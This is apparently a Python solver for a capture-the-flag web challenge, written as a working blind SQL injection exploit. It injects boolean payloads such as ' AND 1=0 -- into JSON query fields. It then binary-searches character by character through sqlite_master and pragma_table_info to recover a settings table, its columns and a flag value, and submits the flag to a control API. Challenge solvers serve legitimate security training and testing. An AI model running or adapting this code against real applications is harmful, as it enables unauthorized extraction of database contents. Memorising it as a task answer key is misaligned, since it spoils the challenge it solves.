from __future__ import annotations

import re
import requests


def _sql_literal(value: str) -> str:
    return "'" + value.replace("'", "''") + "'"


def _identifier(value: str) -> str:
    if not re.fullmatch(r"[A-Za-z_][A-Za-z0-9_]*", value):
        raise AssertionError("unexpected identifier")
    return '"' + value.replace('"', '""') + '"'


def solve(target_url: str, control_url: str | None = None, instance_id: str | None = None) -> str:
    client = requests.Session()
    home = client.get(target_url + "/", timeout=20)
    assert home.status_code == 200
    endpoint = re.search(r"QUERY_ENDPOINT\s*=\s*['\"]([^'\"]+)", home.text).group(1)
    fields = re.search(r"FIELD_NAMES\s*=\s*\[['\"]([^'\"]+)['\"],\s*['\"]([^'\"]+)['\"]\]", home.text)
    assert fields
    field_a, field_b = fields.groups()
    examples = re.findall(r"data-asset-no=['\"]([^'\"]+)['\"]\s+data-department=['\"]([^'\"]+)", home.text)
    assert len(examples) >= 2
    valid_asset, valid_department = examples[0]
    invalid_asset, invalid_department = examples[1]
    requests_seen = 0

    def query(payload: dict[str, str]) -> bool:
        nonlocal requests_seen
        requests_seen += 1
        response = client.post(target_url + endpoint, json=payload, timeout=20)
        assert response.status_code == 200, response.text
        return bool(response.json()["matched"])

    assert query({field_a: valid_asset, field_b: valid_department}) is True
    assert query({field_a: invalid_asset, field_b: invalid_department}) is False
    base = {field_a: valid_asset, field_b: valid_department}
    vulnerable_field = None
    for field in (field_a, field_b):
        probe = dict(base)
        probe[field] = str(probe[field]) + "' AND 1=0 -- "
        if query(probe) is False:
            true_probe = dict(base)
            true_probe[field] = str(true_probe[field]) + "' AND 1=1 -- "
            if query(true_probe) is True:
                vulnerable_field = field
                break
    assert vulnerable_field is not None

    def boolean(condition: str) -> bool:
        probe = {field_a: valid_asset, field_b: valid_department}
        probe[vulnerable_field] = str(probe[vulnerable_field]) + f"' AND ({condition}) -- "
        return query(probe)

    def infer_length(expression: str, upper: int = 64) -> int:
        low, high = 0, upper
        while low < high:
            middle = (low + high) // 2
            if boolean(f"length(cast(({expression}) as text)) > {middle}"):
                low = middle + 1
            else:
                high = middle
        return low

    def infer_number(expression: str, upper: int = 16) -> int:
        low, high = 0, upper
        while low < high:
            middle = (low + high) // 2
            if boolean(f"({expression}) > {middle}"):
                low = middle + 1
            else:
                high = middle
        return low

    def infer_ascii(expression: str, position: int) -> str:
        low, high = 0, 127
        while low < high:
            middle = (low + high) // 2
            if boolean(f"unicode(substr(cast(({expression}) as text), {position}, 1)) > {middle}"):
                low = middle + 1
            else:
                high = middle
        return chr(low)

    table_expression = "(select name from sqlite_master where type='table' and name like '%setting%' limit 1)"
    table_length = infer_length(table_expression)
    assert table_length > 0
    settings_table = "".join(infer_ascii(table_expression, position) for position in range(1, table_length + 1))
    table_sql = _sql_literal(settings_table)
    column_count_expression = f"(select count(*) from pragma_table_info({table_sql}))"
    column_count = infer_number(column_count_expression, upper=16)
    columns = []
    for offset in range(column_count):
        expression = f"(select name from pragma_table_info({table_sql}) order by cid limit 1 offset {offset})"
        length = infer_length(expression)
        columns.append("".join(infer_ascii(expression, position) for position in range(1, length + 1)))
    value_column = next((column for column in columns if "value" in column.lower()), None)
    assert value_column is not None
    flag_expression = f"(select {_identifier(value_column)} from {_identifier(settings_table)} where cast({_identifier(value_column)} as text) like 'flag{{%' limit 1)"
    flag_length = infer_length(flag_expression, upper=64)
    assert flag_length > 0
    flag = "flag{"
    alphabet = "0123456789abcdef"
    for position in range(6, flag_length):
        index_low, index_high = 1, len(alphabet)
        while index_low < index_high:
            middle = (index_low + index_high) // 2
            if boolean(f"instr({_sql_literal(alphabet)}, substr(cast(({flag_expression}) as text), {position}, 1)) > {middle}"):
                index_low = middle + 1
            else:
                index_high = middle
        flag += alphabet[index_low - 1]
    flag += "}"
    assert len(flag) == flag_length and re.fullmatch(r"flag\{[0-9a-f]+\}", flag)
    if control_url and instance_id:
        result = requests.post(control_url + f"/api/v1/instances/{instance_id}/submit", json={"flag": flag}, timeout=20).json()
        assert result["data"]["correct"]
    return flag
